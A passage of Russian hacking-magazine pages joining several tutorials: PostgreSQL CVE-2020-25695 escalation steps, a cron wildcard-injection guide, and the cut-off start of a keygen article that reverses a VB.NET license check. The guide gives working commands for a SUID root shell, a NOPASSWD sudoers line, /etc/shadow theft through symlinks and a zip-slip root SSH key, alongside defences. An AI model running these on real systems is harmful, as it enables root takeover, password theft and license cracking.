CONSTRAINT  TRIGGER —  особый вид  триггеров, который  используется
для обеспечения целостности данных и может быть отложен. В этом случае
он будет выполнен после  вставки: AFTER  INSERT. Триггер срабатывает
на каждую строку: INITIALLY DEFERRED — это отложенное выполнение, а FOR
EACH  ROW заставляет триггер срабатывать на каждую отдельную вставку.
Командой EXECUTE PROCEDURE указываешь функцию для выполнения.





                       Очередность выполнения атаки

Чекни права пользователя, убедись, что testuser не суперпользователь:


docker exec -it cve2020-25695-pg psql -U postgres -d testbase -c
"SELECT rolname, rolsuper FROM pg_roles WHERE rolname = 'testuser';"

В PostgreSQL есть фоновый механизм обслуживания таблиц — автоматичес‐
кий VACUUM. Он  выполняет VACUUM для  наведения  порядка и ANALYZE
для обновления внутренней статистики. PostgreSQL не все операции выпол‐
няет сразу. Например, DELETE не удаляет строку из таблицы, а помечает ее
как dead_tuples . Это нужно для повышения производительности. Автовакуум
включается, когда количество измененных строк превышает значение, опре‐
деленное в:
 • autovacuum_vacuum_threshold ;
 • autovacuum_analyze_threshold .

Попробуем триггернуть его, снизив значения до 1 :


ALTER TABLE trig SET (autovacuum_vacuum_threshold = 1);
ALTER TABLE trig SET (autovacuum_analyze_threshold = 1);

Если принудительно запустить сервисную функцию сейчас, ничего не про‐
изойдет. Индекс, который проверяет PostgreSQL, указывает на таблицу trig .
Нужно добавить в нее значение:


INSERT INTO trig VALUES (1, 1);

Можно подождать, пока автовакуум увидит изменения и запустит ANALYZE .
Но быстрее и проще запустить его самому:


docker exec -it cve2020-25695-pg psql -U postgres -d testbase -c
"ANALYZE trig;"

Подожди 5–10 с и проверь, не стал ли testuser суперпользователем:


docker exec -it cve2020-25695-pg psql -U postgres -d testbase -c
"SELECT rolname, rolsuper FROM pg_roles WHERE rolname = 'testuser';"





                                   Результат атаки

В реальной работе есть смысл вставить в «триггерную» таблицу огромное
количество значений — это спровоцирует хотя бы один из триггеров авто‐
вакуума.


ЗАКЛЮЧЕНИЕ

В статье я рассмотрел базовые знания по эскалации привилегий, чтобы поз‐
накомить с темой. Когда я сам впервые с ней столкнулся, информации было
довольно мало. Пишут: грузи UDF. А что это? Зачем это? Что внутри биб‐
лиотек и как это работает? Я постарался снять эти вопросы, показав не толь‐
ко механику, но и то, что скрывается внутри. Однако мы обошлись без под‐
робного разбора: все же статья не про программирование на C. Надеюсь,
цель достигнута!
   Статья не  охватывает и сотой доли способов эскалации привилегий
как внутри СУБД, так и в операционных системах. Например, механизм атаки
через UDF прекрасно работает в PostgreSQL. В MS SQL Server свои фишки.
Есть довольно интересный способ подняться до суперадмина базы, вмешав‐
шись в механизм репликации.
  В MySQL была отличная уязвимость, при которой через race condition мож‐
но было получить суперпользователя. В PostgreSQL после исправления CVE-
2020-25695  появилась  похожая  уязвимость,  но  основанная  на  VIEW
и механизме обновлений. И это только часть СУБД.
   Если статья понравилась и хочешь углубиться в тему, пиши в комментах,
и совсем скоро будет новый бомбический материал! © X
ВЗЛОМ





Сегодня разберем на примере ту самую
ситуацию, когда админ, настраивая бэкапы
или парсинг, использовал в cron шаблоны
подстановки и, не подозревая неладного,              ret0x2A
                                                                                            @ret0x2A
открыл хакерам прямой путь к рут‑доступу.


Cron
Утилита cron — это стандартный планировщик задач в Unix-подобных опе‐
рационных системах, который позволяет автоматически выполнять команды
или скрипты по заданному расписанию. Работает как фоновый сервис
(демон), который регулярно проверяет конфигурационные файлы и запускает
задания в нужное время. Расписание задается с помощью специальных
выражений в файле crontab, где указываются минуты, часы, дни месяца,
месяцы и дни недели. Cron широко используется для автоматизации сис‐
темного администрирования, например для резервного копирования, очис‐
тки логов, обновления данных и выполнения периодических задач без участия
пользователя.


Wildcard-атаки через cron используют глобальные шаблоны в запланирован‐
ных задачах Unix/Linux. Чтобы не перечислять конкретные файлы в папке,
админ может использовать * , [] или ? . Звездочка * обозначает любое
сочетание символов. Классический пример уязвимой записи в cron:


* * * * * cd /var/www/html && tar -czf /backup/html.tgz *

Оболочка перейдет в директорию /var/www/html и выполнит архивирование
всех вложенных файлов и папок. В архив попадет все, что есть в папке и к
чему есть доступ у пользователя, создавшего задачу.
   Часто, чтобы избежать проблем с правами, скрипты бэкапов запускают
от имени пользователя с высокими привилегиями, вплоть до root . Неопыт‐
ные админы не видят в этом проблемы, потому что команда кажется безопас‐
ной.
   Более  тонкую  настройку  позволяет выполнить знак вопроса ? .  Воп‐
росительный знак — это один любой символ. Например, под шаблон ?.txt
подходят текстовые файлы, название которых состоит только из одного сим‐
вола.
   Если нужно жестче ограничить рамки, можно использовать квадратные
скобки [] . Внутри скобок указываем диапазон: под шаблон [0-9].txt под‐
ходят имена файлов, состоящие из одной цифры: 0.txt, 7.txt и так далее.
Чем строже рамки, тем сложнее провести атаку.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ПРОБЛЕМЫ GLOB

В атаке роль cron сводится к запуску от имени пользователя с повышенными
привилегиями. Например, при создании бэкапа может потребоваться архи‐
вировать файлы, к которым пользователь www-data не имеет доступа.
   Основную работу выполняет glob — один из элементов оболочки Linux.


Glob
Glob — это механизм сопоставления строк с шаблонами, широко исполь‐
зуемый в Unix-подобных системах и языках программирования для поиска
файлов и обработки путей. Он позволяет задавать шаблоны с использовани‐
ем специальных символов, таких как * , ? и диапазоны в квадратных скобках,
чтобы выбирать группы файлов по имени. Glob-шаблоны проще регулярных
выражений и ориентированы именно на сопоставление имен файлов и путей.


Перед выполнением системной команды с шаблоном, например * ,  shell
передает работу glob. Glob сканирует директорию и возвращает готовый
набор файлов.
   Чтобы отследить, как работает glob, можешь заархивировать любую папку
с использованием strace и шаблона * :


strace -f -e trace=execve tar czf /backup/out.tgz * 2>&1 | grep
execve




Обрати внимание, как выглядит итоговый вызов tar: /usr/bin/tar и аргу‐
менты ["tar",  "czf",  "/backup/out.tgz",  "about.html",  "books.
html", ...] . Glob просканировал папку, нашел четыре файла и передал их
имена архиватору.
   Алгоритм работы вполне предсказуем, понятен и выглядит безопасно.
Если бы не лояльность Linux к именам файлов! Пользователь может соз‐
давать файлы с любыми названиями — главное, чтобы в них не было нулевого
символа и / .
   Попробуем выполнить такую команду: touch  --  '--bzip2' — и пов‐
торить архивацию с strace. Обязательно используй два дефиса -- и оберни
имя в кавычки, иначе touch воспримет имя файла как параметр запуска
и выдаст ошибку.




Файл --bzip2 не отмечен никаким дополнительным флагом. Архиватор обра‐
ботает его как полноценный аргумент запуска и поменяет алгоритм сжатия.
Для наглядности давай исключим какой‑нибудь файл из архива, создав файл
touch  --  '--exclude=index.html' . После архивации посмотри содер‐
жимое бэкапа.





На скриншоте видно, что файл index.html передан  tar для архивации.
Но рядом с ним передано имя файла --exclude=index.html , которое tar
воспринял как отдельный параметр. В итоговом архиве отсутствует файл
index.html , что подтверждает работоспособность атаки. Значит, есть смысл
двигаться дальше и использовать более интересные подходы.
   У tar есть два интересных параметра: --checkpoint и --checkpoint-
action. При выполнении больших операций, вроде архивации терабайтов
инфы, чекпойнты позволяют настроить обратную связь: приостановить архи‐
вацию для выполнения других операций, вывести сообщение пользователю
или выполнить сторонний скрипт. Понимаешь, к чему клоню?
   Параметр --checkpoint  указывает, через какое  количество записей
в архиве выполнять действие. По умолчанию tar использует значение 10 . Мы
с тобой будем указывать 1 . Хотя бы одна запись будет обработана всегда.
Если поставить больше, атака может не выполниться. Ноль тоже не вариант,
так как он полностью отключит чекпойнты.
   Второй параметр указывает конкретное действие. Классический пример:
--checkpoint-action=exec=sh pwn.sh . Действие — exec , то есть выпол‐
нение системной команды. Команда sh pwn.sh — выполнить скрипт pwn.sh .
Имя pwn.sh использовано для примера, можешь взять любое другое.
   Обрати внимание, что скрипт будет выполняться из текущей директории.
Указать абсолютный путь не выйдет: для этого потребовался бы символ / ,
а он запрещен в именах файлов.
   Создай pwn.sh и файлы с названиями параметров, после чего выполни
архивацию снова:


cat > pwn.sh << 'EOF'
cp /bin/bash /home/xakep/bash
chmod +s /home/xakep/bash
EOF


touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
strace -f -e trace=execve tar czf /backup/out.tgz * 2>&1 | grep
execve





Из вывода strace видно, что параметры --checkpoint и --checkpoint-
action успешно переданы  tar. Видны процессы с PID от 1266 до 1268,
которые созданы для выполнения нашей инъекции. Запущен pwn.sh , затем
скопирован bash , и в завершающем процессе установлены биты SUID и SGID .
Когда установлены эти биты, файл будет выполняться от имени владельца
файла ( root ). В папке /home/xakep/ появился бинарник bash . Атака сработа‐
ла: используя этот bash , можешь закрепиться в системе с полным доступом.


WILDCARD-АТАКА

Теперь, когда есть понимание принципа атаки, можно повторить ее, исполь‐
зуя cron. Я для демонстрации запустил Ubuntu Server 24.04 LTS в VirtualBox.
Разверни систему на своей машине. После запуска тестового сервера уста‐
нови программы, которые помогут тебе перехватывать управление сервером.


sudo apt update


sudo apt install -y \
    tar \
    p7zip-full \
    python3 \
    python3-pip

Добавь пользователя xakep для тестов: adduser xakep . Создай папку /var/
www/html , положи в нее пару обычных файлов и повтори действия с создани‐
ем атакующих файлов: pwn.sh , --checkpoint-action=exec=sh pwn.sh и --
checkpoint=1. Выполни crontab -e и добавь в crontab строку


* * * * * cd /var/www/html && tar -czf /backup/html.tgz *

Сохрани. Через минуту‑полторы проверь папку /home/xakep/: в ней должен
появиться bash . Этот бинарник дает неограниченный доступ к серверу.
Перелогинься от имени xakep и выполни ./bash -p , чтобы запустить оболоч‐
ку с правами root. Выполни id или whoami, чтобы убедиться в успешности ата‐
ки.





Минус в том, что файл bash слишком заметен. Хорошая альтернатива —
записать доступного пользователя в sudoers . Вернись в root и перепиши
pwn.sh на такой:


echo "xakep ALL=(root) NOPASSWD: ALL" >> /etc/sudoers

Дождись, когда команда выполнится, и убедись, что xakep может исполь‐
зовать sudo без пароля: sudo -l -U xakep . Либо перелогинься и попробуй
выполнить команду с sudo .





             INFO

                            Если хочешь повысить надежность атаки, охва‐
                         тить максимум систем — используй для запуска
                   sh , а не bash . Встречаются системы, где bash
                              отсутствует вовсе.


Не только tar уязвим к атакам cron wildcard. На сайте GTFOArgs выложена под‐
борка инструментов с подробными инструкциями по инъекции параметров.
Но обрати внимание, что glob сортирует список файлов по алфавиту. Если
приложению важен порядок аргументов, инъекция не сработает. В этом слу‐
чае подумай: возможно, есть вариант подобрать алфавитный порядок.
   Например, если есть параметр -exec и через пробел нужно указать запус‐
каемый файл, попробуй назвать его -exec.sh . Тогда отсортированные аргу‐
менты будут выглядеть так: [...,  -exec,  -exec.sh,  ...] , и инъекция
может сработать. Помни про локаль: сортировка зависит от LC_COLLATE .
В некоторых системах с en_US.UTF-8 символ @ идет перед буквами. Лучше
всегда проверять это перед атакой: locale  |  grep  LC_COLLATE . Пос‐
мотреть, как glob отсортирует файлы, можно командой echo * . Шаблон *
вызовет glob, а echo выведет результат.
  Не сработают инъекции, в которых необходимо прописывать путь. Ты
выполняешь инъекцию через имя файла, а в именах файлов запрещено
использование / .


ЗАЩИТА И ОБХОД

Атаку легко поломать, если указать конкретную папку для архивации:


strace -f -e trace=execve tar czf /backup/out.tgz /var/www/html/* 2>&
1 | grep execve





Такая запись вынудит glob использовать абсолютные пути вместо отно‐
сительных. Каждый переданный файл будет содержать /var/www/html , вклю‐
чая файлы‑инъекции: /var/www/html/--checkpoint=1 . Проверь папку /tmp:
в ней не окажется файла bash . Если он там лежит, ты просто забыл его уда‐
лить перед тестом.
   Неплохой способ защиты — поставить -- перед звездочкой: -- * . Два
дефиса — стандартное соглашение POSIX: все после двойного дефиса пар‐
сится как позиционные аргументы, а не флаги. Большинство программ его
поддерживают.


strace -f -e trace=execve tar czf /backup/out.tgz -- * 2>&1 | grep
execve





Достаточно надежный способ защиты от инъекций — использовать два
дефиса и точку: -- . Точка указывает на текущий каталог, при этом не про‐
исходит расширения путей через glob: нет расширения — нет передачи име‐
ни файла как параметра.


* * * * * cd /var/www/html && tar -czf /backup/html.tgz -- .

Атака не сработает, бинарник в /tmp не появится. Попробуй запустить коман‐
ду руками с strace — увидишь, что в аргументах вызова нет списка файлов,
есть только точка. Шелл передал точку в tar, а архиватор уже сам обошел все
файлы безопасно и заархивировал.





               Два дефиса и точка обезопасили запуск

В большинстве мануалов под wildcard-атаками подразумевают шаблон * .
Работа с шаблонами [] и ? очень специфична, зависит от конкретной инс‐
трукции в cron . Часто эти шаблоны неэксплуатируемы. Но есть варианты.
  Один из таких примеров эксплуатации — кража файла паролей /etc/
shadow вместе с /etc/passwd. Веб‑приложение клиента использовало дан‐
ные, сохраненные в файлах .dat. Имя файла генерировало приложение
по шаблону. Под этот шаблон и был настроен бэкап вида ???.dat. Для прос‐
тоты продемонстрирую на примере tar. Строка задания cron:


* * * * * cd /var/www/html && tar --dereference -czf /backup/arch.
tgz -- ???.dat

Как видишь, в три символа прописать параметры для инъекции не получится.
И  двойной дефис  защищает  от  инъекции  параметров.  Надежду  дает
параметр --dereference . Он меняет поведение tar при работе с симлинками
в Linux. Если tar натыкается на симлинк, он архивирует не ссылку, а файл
или каталог, на который она указывает. Чтобы стащить файл с паролями,
выполни


ln -s /etc/shadow pas.dat
ln -s /etc/passwd usr.dat

Когда  cron  запустит  выполнение,  glob  найдет все  файлы, подходящие
под шаблон ???.dat, и передаст их tar. Архиватор увидит, что pas.dat —
это ссылка на файл /etc/shadow, и запакует в архив сам файл. Тебе останет‐
ся только скачать архив и распаковать его. Не забудь вместе с shadow ута‐
щить passwd: оба файла нужны для вскрытия пароля с помощью unshadow
и John the Ripper.





Некоторые приложения позволяют обойти защиту -- * . Архиватор 7-Zip под‐
держивает распаковку симлинков через @filename. Механизм подобен --
dereference , с той разницей, что ты сам влияешь на поведение 7-Zip.
От админа не требуется указывать какие‑то спорные параметры.
   Создай папку /var/www/html/uploads . Закомментируй в cron все лиш‐
нее, добавь строку для 7z:


* * * * * 7z a /backup/arch.7z -t7z -- /var/www/html/uploads/*

Еще один плюс атаки через 7-Zip — не требуется переход в папку  ( cd ).
В задании cron мы сразу вызываем архиватор и указываем, что нужно отпра‐
вить в архив. Это значительно повышает шанс атаки. Она сработает, даже
если админ использует точку как указание на необходимость архивировать
текущую директорию.
   Перейди в папку uploads и выполни


ln -s /etc/shadow   shadow.txt
touch @shadow.txt

Первой командой создаем ссылку на нужный файл. Дальше создаем пустой
файл с таким же именем, как у симлинка, но с префиксом @ . Этот файл сооб‐
щает  7-Zip, что нужно не просто скопировать  ссылку, а развернуть ее
и добавить в архив исходный файл.





Специально  сделал  скриншот  так,  чтобы  продемонстрировать  разницу.
В терминале команда ls -lsa показала, что файл shadow.txt — это ссылка
на /etc/shadow, а его размер — 11 байт. В архиве же файл shadow.txt
занимает почти в 100 раз больше места. Внутри — содержимое защищен‐
ного  файла /etc/shadow.  Поздравляю, ты  снова смог  получить файл
с хешами паролей.


АТАКА ЧЕРЕЗ РАСПАКОВКУ

Атака cron wildcard возможна не только при архивировании; распаковка тоже
способна  принести  серьезные  проблемы.  Например,  веб‑приложение,
которое подтягивает прайсы от разных поставщиков, скачивает архивы с сер‐
веров, далее разбирает их и добавляет в базу данных. В подобных схемах ты
можешь найти SSRF, которая позволит загрузить в папку свой архив.
   Начни с генерации SSH-ключей:


ssh-keygen -t ed25519 -f hacker_key -N ""

В современных архиваторах редко встречается directory traversal (например,
CVE-2025-6218 в WinRAR), но возможность атаки сохранилась. Например,
если админ написал такой скрипт распаковки на Python:


import zipfile, os, sys


EXTRACT_DIR = '/var/www/uploads/extracted/'


for archive in sys.argv[1:]:
    print(f"[*] Processing: {archive}")
    try:
        with zipfile.ZipFile(archive) as z:
            for member in z.infolist():
                target = os.path.join(EXTRACT_DIR, member.filename)
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with z.open(member) as src, open(target, 'wb') as dst
:
                    dst.write(src.read())
        print(f"[+] Done: {archive}")
    except Exception as e:
        print(f"[-] Error: {e}")


# Код загрузки данных в базу

Сохраним скрипт в /var/www/utils/import.py , в cron добавим запись


* * * * * cd /var/www/html/uploads/prices && python3 /var/www/utils/
import.py * .zip

Создадим вредоносный архив с помощью скрипта на Python:


import zipfile, io


key = open('hacker_key', 'rb').read()


with zipfile.ZipFile('prices.zip', 'w') as z:
    z.writestr('../../../../root/.ssh/authorized_keys', key)


print("Done")

После работы скрипта появится архив prices.zip. Копируем архив в папку /
var/www/html/uploads/prices на  сервере. Ждем  выполнения  скрипта
и ставим папку /root/.ssh. Когда cron отработает, в папке появится файл
authorized_keys, внутри файла лежит ключ. Для уверенности можешь про‐
тестировать подключение по SSH.





                 Ручной запуск атаки через directory traversal


ВЫВОДЫ

Cron wildcard — это не конкретная уязвимость, а набор техник, основанный
на возможностях glob. Добравшись до сервера, внимательно изучай настрой‐
ки cron. Инъекция каждый раз будет индивидуальной.
  В подобных техниках почти нет места для автоматического тестирования.
Перечисление по шаблону не всегда даст результат: вариаций слишком мно‐
го и легко упустить возможность для атаки. Слепые попытки спамить файлами
скорее раскроют тебя перед админами, чем дадут результат.
   Возможно, в недалеком будущем тебе смогут помочь аблитерированные
нейросети, но пока даже мощные облачные модели плохо ориентируются
в cron wildcard. Я проверял. Вместо рабочих рецептов — галлюцинации,
не имеющие отношения к реальному миру. Даже когда тычешь ИИ в правиль‐
ное решение, может потребоваться время, чтобы убедить его в своей пра‐
воте.
   Проходя CTF или работая в реальном пентесте, придерживайся алгорит‐
ма: нашел записи с шаблонами * , [] , ? — читай мануалы по утилитам, гугли
известные инъекции. Воспроизводи ПО на своем тестовом сервере, пытайся
подобрать вариант инъекции скрипта через параметры или утащить файл
с важными данными.
   Когда схема атаки отработана, выполняй разрешенные действия на сер‐
верах заказчика. И помни: не используй эти знания в криминальных целях! © X
ВЗЛОМ





Иногда  разработчики  софта  используют
хитроумные кастомные алгоритмы провер‐
ки лицензий. Разобраться в принципах их
работы очень непросто. Сегодня мы раз‐                                                                               JaboHack
берем  деобфусцированный  код  такого
алгоритма, решим нелинейное криптоурав‐
нение,   отсеем   ложные   зависимости
и напишем рабочий  генератор  ключей.
При реверсе мы задействуем ИИ в качестве
помощника, заодно оценим его аналити‐
ческие способности в этой сфере.


           WARNING

                        Статья    имеет    ознакомительный    характер
                      и  написана  в  образовательных  целях.  Автор
                      и редакция не несут ответственности за любой
                        вред, причиненный с применением изложенной
                        информации.


Мы уже рассматривали в предыдущих статьях стандартные криптоалгоритмы
или их модификации, однако бывают случаи, когда и самописный алгоритм
становится хорошей разминкой для  мозгов, даже если он реализован
на заурядном дотнетовском бейсике. В своей статье « Золотой ключик. Раз‐
бираем на примере принцип создания кейгенов » я уже рассказывал, как раз‐
работчики защищают программы при помощи генерации лицензионных клю‐
чей, а также о том, как самому создавать подобные генераторы.
  Мы изучали и совсем простой случай, и вариант не особо продуманной
модификации стандартного криптоалгоритма . Однако недавно я столкнулся
с хитрой реализацией проверки кода продукта вообще без использования
стандартных алгоритмов.
   Итак, условие задачи: имеется некая программа, и для ее активации необ‐
ходим код, который зависит от имени пользователя. При вводе правильного
кода активация программы переходит на следующий этап, если ввести неп‐
равильный — прерывается.





Программа вполне заурядная, написана на VB.NET, не использует никаких
серьезных протекторов, весь код на виду, хотя control flow слегка обфусци‐
рован, вероятно каким‑то простым самописным обфускатором:


PE32
    Operation system: Windows(95)[I386, 32-bit, GUI]
    Linker: Microsoft Linker
    Compiler: VB.NET
    Language: VB.NET
    Library: .NET Framework(CLR 4.0.30319)
    Tool: Microsoft Visual Studio
    (Heur)Protection: Anti analysis[Anti-debug]
    (Heur)Debug data: Contains[Absolute PDB path]
_debug_data.5.sg: PE/_debug_data.5.sg: 10: TypeError: Result of
expression 'PE.getNumberOfDebugDataRecords' [undefined] is not a
function.

Поэтому  на  первых  шагах  все  просто:  программа  легко  загружается
в отладчик dnSpy и позволяет себя отлаживать, благодаря чему мы быстро
находим место валидации product code по имени пользователя.





Конечно, было бы просто замечательно, если бы на месте выделенного
выражения оказалось равенство типа f(Name)==ProductKey. Тогда бы мы
просто реверсировали функцию и получили готовый алгоритм преобразова‐
ния имени в ключ. Но не тут‑то было: если внимательно всмотреться в код, то
мы получаем хитрое криптоуравнение упрощенного вида:


Lenstr("Unregistered7777766666","11111-22222-33333-44444-55555") ==
Cval("11111-22222-33333-44444-55555")

Как видишь, основная беда заключается в том, что первые пять групп
ProductCode входят в обе части уравнения, а значит, его придется решать.
Еще сильнее нагоняет жути, что результаты функций справа и слева —
это длиннющие строки из десятичных цифр, вдобавок разные по длине. Код
этих функций под обфускацией выглядит страшновато, особенно функция
Lenstr, в которой при ближайшем рассмотрении каким‑то образом участвует
еще и текущее время.





Cлегка обнадеживает тот факт, что утилита Krypto Analyzer никакой серьезной
(и тем более асимметричной) криптографии в коде не находит, а значит, про‐
должаем наше исследование. Поскольку обфусцированный код выглядит
совершенно нечитаемым, как я и обещал, воспользуемся плодами науч‐
но‑технического  прогресса  и  подключим  к  процессу  искусственный
интеллект, вежливо попросив его оптимизировать этот самый код. Результат
уже гораздо более читаем, особенно при наличии комментариев. Но все рав‐
но код пугает своим размером:


Public Function Cval(Fname As String) As Object
    Dim text As String = ""
    Dim array(Fname.Length) As String


    ' Этап 1: Перевод символов входной строки в коды AscWv
    For i As Integer = 1 To Fname.Length
        array(i) = Module1.AscWv(Fname(i - 1)).ToString()
    Next


    ' Этап 2: Трансформация кодов каждого символа
    For i As Integer = 1 To Fname.Length
        Dim currentStr As String = array(i)
        Module2API.WorkArray1 = New Byte(currentStr.Length) {}


        For j As Integer = 1 To currentStr.Length
            Dim charCode As Integer = Module1.AscWv(currentStr(j - 1)
)
            Select Case charCode
                Case 50 : Module2API.WorkArray1(j) = CByte(charCode +
47)
                Case 53 : Module2API.WorkArray1(j) = CByte(charCode +
40) ' (53+21+9)+10
                Case 55 : Module2API.WorkArray1(j) = CByte(charCode -
17)
                Case 56 : Module2API.WorkArray1(j) = CByte(charCode +
32)
                Case Else : Module2API.WorkArray1(j) = CByte(charCode
)
            End Select
        Next


        Module2API.CCD(Module2API.WorkArray1, 1)


        ' Сборка промежуточной строки
        Dim tempResult As String = Module2API.WorkArray1(1).ToString(
)
        For j As Integer = 2 To Module2API.WorkArray1.Length - 1
            Dim val As Byte = Module2API.WorkArray1(j)
            tempResult &= (CDbl(val) + Math.Floor(Math.Sqrt(val + j
))).ToString()
        Next
        array(i) = tempResult
    Next


    ' Объединение и подготовка x7
    text = String.Concat(array.Skip(1))
    Module1.x7 = array(2)


    ' Этап 3: Повторная обработка объединенной строки
    Module2API.WorkArray1 = New Byte(text.Length) {}
    For i As Integer = 1 To text.Length
        Module2API.WorkArray1(i) = CByte(Module1.AscWv(text(i - 1)))
    Next


    Module2API.CCD(Module2API.WorkArray1, 1)


    ' Этап 4: Генерация числовой последовательности
    text = ""
    Dim uboundW1 As Integer = Module2API.WorkArray1.Length - 1
    For i As Integer = 1 To uboundW1
        Dim val As Double = Module2API.WorkArray1(i)
        ' Условие num2 > 25 (использовалось некорректно, заменено на
логику по индексу i)
        If i > 25 And i < 51 Then
            text &= Math.Floor(Math.Sqrt(val + uboundW1 + i)).
ToString()
        Else
            text &= (val + Math.Floor(Math.Sqrt(val + i))).ToString()
        End If
    Next


    ' Этап 5: Финальное математическое искажение и реверс
    Dim finalResult As String = ""
    For i As Integer = 1 To text.Length
        If i < text.Length - 4 Then
            Dim mid2 As Double = Val(text.Substring(i - 1, 2))
            Dim part As Double = Math.Floor(Math.Sqrt(mid2)) * (1 + i
) +
                                i * Val(text(i + 1)) + Val(text(i + 2
))
            finalResult &= part.ToString()
        Else
            finalResult &= text(i - 1)
        End If
    Next


    Return StrReverse(finalResult)
End Function




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
   КРИПТОУРАВНЕНИЕ
         РЕШАЕМ НЕЛИНЕЙНУЮ ЗАДАЧУ
               ВАЛИДАЦИИ ЛИЦЕНЗИЙ
               И ОБХОДИМ ЛОВУШКИ
                      ОБФУСКАТОРА




Вторая функция из левой части уравнения Lenstr, в которой параметрами
являются имя Str (слепленное с двумя правыми группами кода) и обрезан‐
ный код options , выглядит еще объемнее:


Public Function Lenstr(Str As String, options As String) As String
    Dim result As String = ""
    Dim num9 As Integer


    ' Инициализация переменных
    Module1.y17 = ""
    Module1.dva1 = Strings.Format(DateAndTime.Now, "HHMMss")
    Module1.testDatas = 7


    ' Обработка короткой строки
    If Strings.Len(Str) < 5 Then
        Str = Module1.dva1 + Str + Strings.StrReverse(Module1.dva1)
    End If


    ' Обработка длинных опций
    If Strings.Len(options) > 101 Then
        Str = Module1.dva1 + options + Strings.StrReverse(Module1.
dva1)
    End If


    ' Приведение к нижнему регистру
    Str = Strings.LCase(Str)


    ' Инициализация массива символов
    Dim array(10) As String
    array(0) = Module1.AscWv("S").ToString()
    array(1) = Module1.AscWv("L").ToString()
    array(2) = Module1.AscWv("Y").ToString()
    array(3) = Module1.AscWv("V").ToString()
    array(4) = Module1.AscWv("W").ToString()
    array(5) = Module1.AscWv("K").ToString()
    array(6) = Module1.AscWv("M").ToString()
    array(7) = Module1.AscWv("F").ToString()
    array(8) = Module1.AscWv("X").ToString()
    array(9) = Module1.AscWv("Q").ToString()
    array(10) = Module1.AscWv("-").ToString()


    GlobalVar.SettingAPP(73) = array(9)


    ' Преобразование массива символов
    For num5 As Integer = 0 To array.Length - 1
        Module2API.WorkArray1 = New Byte(array(num5).Length) {}
        For num7 As Integer = 1 To array(num5).Length
            Dim charCode As Integer = Module1.AscWv(array(num5)(num7
- 1))
            Select Case charCode
                Case 50
                    Module2API.WorkArray1(num7) = CByte(charCode + 47
)
                Case 53
                    Module2API.WorkArray1(num7) = CByte(charCode + 40
) ' (53+21+9)+10
                Case 55
                    Module2API.WorkArray1(num7) = CByte(charCode - 17
)
                Case 56
                    Module2API.WorkArray1(num7) = CByte(charCode + 32
)
                Case Else
                    Module2API.WorkArray1(num7) = CByte(charCode)
            End Select
        Next
        Module2API.CCD(Module2API.WorkArray1, 1)


        ' Сборка преобразованной строки
        array(num5) = Module2API.WorkArray1(1).ToString()
        For num7 As Integer = 2 To Module2API.WorkArray1.Length - 1
            array(num5) &= (CDbl(Module2API.WorkArray1(num7)) + Math.
Floor(Math.Sqrt(Module2API.WorkArray1(num7) + num7))).ToString()
        Next
    Next


    ' Основной цикл обработки
    For num9 = 0 To 4
        Dim text2 As String = ""
        Dim text3 As String = ""


        ' Установка параметров в зависимости от итерации
        Select Case num9
            Case 0
                Module1.x1 = 79 : Module1.x2 = 25 : Module1.x3 = 5 :
Module1.x4 = 11 : Module1.x5 = 19
            Case 1
                If Module1.y11 = 35 Then
                    Module1.x1 = 39 : Module1.x2 = 19 : Module1.x3 =
3 : Module1.x4 = 31 : Module1.x5 = 17
                Else
                    Module1.x1 = 92 : Module1.x2 = 7 : Module1.x3 = 3
: Module1.x4 = 19 : Module1.x5 = 55
                End If
                Module1.XPsizeW = 1
            Case 2
                Module1.x1 = 33 : Module1.x2 = 69 : Module1.x3 = 4 :
Module1.x4 = 45 : Module1.x5 = 31
            Case 3
                Module1.x1 = 79 : Module1.x2 = 11 : Module1.x3 = 2 :
Module1.x4 = 39 : Module1.x5 = 52
            Case 4
                Module1.x1 = 38 : Module1.x2 = 7 : Module1.x3 = 3 :
Module1.x4 = 67 : Module1.x5 = 23
        End Select


        ' Преобразование входной строки в числовую последовательность
        For num10 As Integer = 1 To Strings.Len(Str)
            text2 &= Module1.AscWv(Strings.Mid(Str, num10, 1)).
ToString()
        Next


        ' Извлечение каждого второго символа
        For num10 As Integer = 1 To Strings.Len(text2) Step 2
            text3 &= Strings.Mid(text2, num10, 1)
        Next
        text3 = Strings.StrReverse(text3)


        ' Обработка опций
        Module1.y9 = ""
        If Strings.Trim(options) <> "" Then
            For num10 As Integer = 1 To Strings.Len(options)
                Module1.y9 &= (Module1.AscWv(Strings.Mid(options,
num10, 1)) + 42).ToString() & ","
            Next
        Else
            text3 = Strings.StrReverse(text3)
            text2 = Strings.StrReverse(text2)
        End If


        Module1.q9 = Strings.Split(Module1.y9, ",", -1, CompareMethod
.Binary)
        text3 = text3 & Strings.Mid(text3, Strings.Len(text3) - 4, 2)
& text3


        ' Комбинирование строк
        text2 = ""
        For num10 As Integer = 1 To Strings.Len(Str)
            text2 &= Strings.Mid(text3, num10, 1) & Module1.AscWv(
Strings.Mid(Str, num10, 1)).ToString()
        Next


        If Module1.StrTrimFix(text2, 1) = 1 Then
            text2 &= Strings.Mid(text3, Strings.Len(text3) + 1, 1)
        End If


        Module1.Nsa = Strings.Split(Module1.y9, ",", -1,
CompareMethod.Binary)
        text2 = Strings.StrReverse(text2)
        text3 = ""


        ' Основная обработка строки
        For num10 As Integer = 1 To Strings.Len(text2)
            ' Специальные условия для разных итераций
            If num9 = 2 AndAlso num10 = 7 Then
                If Val(Module1.q9(6)) <> Module1.AscWv(Strings.Mid(
Module1.vtm, Strings.Len(Module1.vtm) \ 4 + 1, 1)) + 42 Then
                    text3 = Strings.Right(text3, Strings.Len(text3) \
3) & Math.Floor(Math.Sqrt(num10 + 201)).ToString()
                End If
                If Val(Module1.q9(7)) <> Module1.AscWv(Strings.Mid(
Module1.vtm, Strings.Len(Module1.vtm) \ 3 + 3, 1)) + 42 Then
                    text2 = Strings.Right(text2, Strings.Len(text2) \
3) & Math.Floor(Math.Sqrt(num10 + 201)).ToString()
                End If
            End If


            If num9 = 2 AndAlso num10 = Module1.x3 Then
                If Val(Module1.q9(9)) <> Module1.AscWv(Strings.Mid(
